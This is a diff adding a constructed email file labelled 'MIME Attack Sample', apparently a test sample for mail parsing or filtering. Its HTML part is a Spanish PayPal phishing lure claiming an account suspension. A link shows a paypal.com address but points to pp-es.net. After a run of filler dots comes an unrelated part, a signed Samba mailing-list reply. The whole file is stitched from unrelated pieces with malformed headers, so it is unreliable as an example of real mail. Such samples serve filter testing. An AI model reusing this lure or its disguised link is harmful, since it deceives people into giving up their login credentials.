@@ -1,0 +1,131 @@
+From: amywilson@btamail.net.cn
+To: jean.adams@enron.com, william.aldinger@enron.com, nancy.bastida@enron.com, 
+Subject: MIME Attack Sample
+Content-Type: multipart/mixed; boundary="BOUNDARY"
+--BOUNDARY
+0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+Content-Length: 1984
+Lines: 54
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 1175
+
+<html>
+<head>
+<title></title>
+</head>
+<body>
+<p><font size=3D"2"><span style=3D"font-family: Arial">Estimado cliente,</sp=
+an></font></p>
+<p><font size=3D"2"><span style=3D"font-family: Arial">Notificamos que su Se=
+rvicio=20
+en l=EDnea se ha suspendido temporalmente debido a intentos fallidos de acce=
+sos a=20
+su cuenta en l=EDnea.</span><br style=3D"font-family: Arial">
+<br style=3D"font-family: Arial">
+<span style=3D"font-family: Arial">Como medida de seguridad hemos decidido=
+=20
+desactivar su cuenta temporalmente , este incidente puede deberse a que real=
+izo=20
+intentos de acceso a su cuenta desde otra direcci=F3n IP debido a el sistema=
+=20
+din=E1mico que utilizan los proveedores de Internet. </span>
+<br style=3D"font-family: Arial">
+<br style=3D"font-family: Arial">
+<span style=3D"font-family: Arial">Para asegurarnos de su autenticidad rogam=
+os=20
+reactivar su cuenta desde el siguiente enlace:</span></font></p>
+<p><font face=3D"Arial" size=3D"2"><a href=3D"http://pp-es.net/pp-es/">
+https://www.paypal.com/es/cgi-bin/webscr?cmd=3D_login-run</a></font></p>
+<p><font face=3D"Arial" size=3D"2">Atentamente,<br>
+PayPal<br>
+<br>
+Est=E1 recibiendo esta notificaci=F3n por correo electr=F3nico porque esta d=
+irecci=F3n=20
+de correo es la que aparece como contacto administrativo de su cuenta PayPal=
+=2E<br>
+<br>
+No responda a este correo electr=F3nico. Este buz=F3n no se supervisa y no r=
+ecibir=E1=20
+respuesta. Si necesita ayuda, inicie sesi=F3n en su cuenta PayPal y pulse el=
+=20
+v=EDnculo Ayuda de la esquina superior derecha de cualquier p=E1gina de PayP=
+al.</font></p>
+<hr>
+<p><font face=3D"Arial" size=3D"2">Copyright =A9 1999-2009 PayPal. Todos los=
+ derechos=20
+reservados.<br>
+<br>
+PayPal (Europe) S.=E0 r.l. &amp; Cie, S.C.A.<br>
+Soci=E9t=E9 en Commandite par Actions<br>
+Sede social: 22-24 Boulevard Royal, 5=E8me =E9tage, L-2449, Luxembourg<br>
+RCS Luxembourg B 118 349<br>
+<br>
+Id. de correo electr=F3nico de PayPal PP037</font></p>
+</body>
+</html>
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+Content-Type: text/plain
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+James Peach wrote:
+> On May 30, 2007, at 4:06 PM, jerry@samba.org wrote:
+> 
+>> Author: jerry
+>> Date: 2007-05-30 23:06:48 +0000 (Wed, 30 May 2007)
+>> New Revision: 23256
+>>
+>> WebSVN:
+>> http://websvn.samba.org/cgi-bin/viewcvs.cgi?view=rev&root=samba&rev=23256
+>>
+>> Log:
+>> fix length and siglen checks in pac_io_pac_signature_data()
+>> Modified:
+>>   branches/SAMBA_3_0_26/source/libads/authdata.c
+> 
+> Shouldn't this be in SAMBA_3_0 as well?
+
+It got accidentally checked in a previous commit.  See svn r23251.
+
+
+
+
+
+
+cheers, jerry
+
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.6 (GNU/Linux)
+Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
+
+iD8DBQFGXjlzIR7qMdg1EfYRArpMAJ9VLpvLJjUEMKqwUAiEd5GlI2JgYgCeIvqp
+q3Az3+JlDHbM9wZpZgTI/AQ=
+=JWHn
+-----END PGP SIGNATURE-----
+-BOUNDARY--
